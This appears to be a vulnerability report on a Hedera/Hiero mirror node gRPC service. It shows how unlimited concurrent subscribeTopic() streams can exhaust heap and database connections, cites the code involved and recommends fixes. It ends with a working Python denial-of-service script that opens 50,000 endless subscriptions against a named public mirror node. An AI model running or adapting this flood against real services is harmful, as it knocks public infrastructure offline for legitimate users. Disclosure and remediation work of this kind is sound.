### Title
Unbounded Concurrent Subscriptions on `subscribeTopic()` Enable Heap Exhaustion DoS

### Summary
The `subscribeTopic()` endpoint in `ConsensusController` accepts an unlimited number of concurrent gRPC connections with no per-IP rate limiting, no global subscription cap, and no authentication. An unprivileged attacker can open thousands of TCP connections — each carrying up to 5 concurrent long-lived `subscribeTopic()` streaming calls — exhausting JVM heap memory and database connection pool resources, rendering the gRPC service unavailable.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) creates a Reactor subscription per call with no guard:

```java
// grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java:43-53
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);
```

**Root cause — the only server-side limit is per-connection, not global:**

`GrpcConfiguration.java` (lines 28–35) configures the Netty server with only one constraint:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

`NettyProperties.java` (line 14) sets this to `5`. There is no `maxInboundConnections`, no `maxConnectionAge`, no per-IP limit, and no total-subscription cap configured anywhere in the gRPC module.

**No rate limiting exists in the gRPC module:** A grep across all `grpc/**/*.java` for `ThrottleManager`, `RateLimiter`, `bucket4j`, or `Bucket` returns zero matches. The web3 module has a full bucket4j throttle stack (`ThrottleManagerImpl`, `RequestProperties`), but the gRPC module has none.

**Subscriber count is metric-only, not enforced:**

`TopicMessageServiceImpl.java` (lines 48, 88–91) tracks `subscriberCount` via an `AtomicLong` and exposes it as a Micrometer gauge, but never enforces a ceiling:

```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
// ...
.doOnSubscribe(s -> subscriberCount.incrementAndGet())
.doFinally(s -> subscriberCount.decrementAndGet())
```

**Exploit flow:**

1. Attacker opens `N` TCP connections to port 5600 (no authentication, no IP-based connection limit).
2. On each connection, attacker issues 5 concurrent `subscribeTopic()` streaming RPCs (the per-connection maximum), each with `startTime=0` and no `endTime` and no `limit` — creating an infinite live subscription.
3. Total active subscriptions = `5 × N`. Each subscription holds: a Reactor pipeline object graph, a slot in the shared `TopicListener`/Redis subscriber, and periodic DB polling via `TopicMessageRetriever`.
4. As `N` grows, JVM heap fills with pipeline state; HikariCP DB connection pool saturates; the Spring `ThreadPoolTaskExecutor` queue (unbounded by default) accumulates pending tasks.
5. JVM throws `OutOfMemoryError` or the service becomes unresponsive under GC pressure.

**Existing checks reviewed and shown insufficient:**

| Check | Scope | Insufficient because |
|---|---|---|
| `maxConcurrentCallsPerConnection = 5` | Per TCP connection | Does not limit number of connections |
| `TopicMessageFilter` validation | Field values | Only validates `limit ≥ 0`, `startTime ≥ 0`, topic existence — no subscription count check |
| `subscriberCount` gauge | Metrics only | Read-only counter, no enforcement ceiling |
| No authentication | — | Endpoint is fully open to anonymous callers |

### Impact Explanation
Each long-lived `subscribeTopic()` stream with no `limit` and no `endTime` is permanent until the client disconnects. With thousands of such streams, heap memory is exhausted (JVM `OutOfMemoryError`), the HikariCP pool is saturated (all legitimate queries block), and the gRPC service crashes or becomes unresponsive. This is a complete denial of service of the HCS (Hedera Consensus Service) mirror node gRPC API — a critical public infrastructure component for the Hedera network.

### Likelihood Explanation
The attack requires only a standard gRPC client library (e.g., `grpc-java`, `grpcurl`, Python `grpcio`). No credentials, no special network position, and no prior knowledge beyond the publicly documented proto schema are needed. The attacker can script connection flooding from a single machine or a small botnet. The attack is repeatable and can be sustained indefinitely. The `GrpcNoSubscribers` alert in the Helm charts confirms the service is publicly reachable and subscriber counts are operationally significant.

### Recommendation

1. **Enforce a global maximum concurrent subscription count** in `TopicMessageServiceImpl.subscribeTopic()`: check `subscriberCount` against a configurable ceiling and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add `maxInboundConnections(N)` to `GrpcConfiguration`** via `NettyServerBuilder` to cap total TCP connections.
3. **Add per-IP connection rate limiting** at the ingress/Traefik layer or via a gRPC `ServerInterceptor`.
4. **Set `maxConnectionAge` and `maxConnectionIdle`** on `NettyServerBuilder` to reclaim resources from idle or long-lived connections.
5. **Add a configurable `maxConcurrentSubscriptionsPerIP`** interceptor, mirroring the bucket4j throttle pattern already used in the web3 module (`ThrottleManagerImpl`, `RequestProperties`).

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hedera.proto import timestamp_pb2, basic_types_pb2

TARGET = "mirror.hashio.io:443"  # or any public mirror node

def flood_subscriptions(thread_id, n_connections=200):
    for i in range(n_connections):
        channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
        stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
        query = consensus_service_pb2.ConsensusTopicQuery(
            topicID=basic_types_pb2.TopicID(topicNum=1),
            consensusStartTime=timestamp_pb2.Timestamp(seconds=0),
            # no endTime, no limit -> infinite stream
        )
        # Issue 5 concurrent calls per connection (maxConcurrentCallsPerConnection limit)
        for _ in range(5):
            threading.Thread(
                target=lambda: list(stub.subscribeTopic(query)),
                daemon=True
            ).start()

# Launch from multiple threads to open thousands of connections
threads = [threading.Thread(target=flood_subscriptions, args=(t,)) for t in range(50)]
for t in threads: t.start()
for t in threads: t.join()
# Result: 50 threads × 200 connections × 5 calls = 50,000 concurrent subscriptions
# -> JVM heap exhaustion / OOM on the mirror node gRPC server
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L11-15)
```java
public class NettyProperties {

    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-48)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L88-91)
```java
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
```
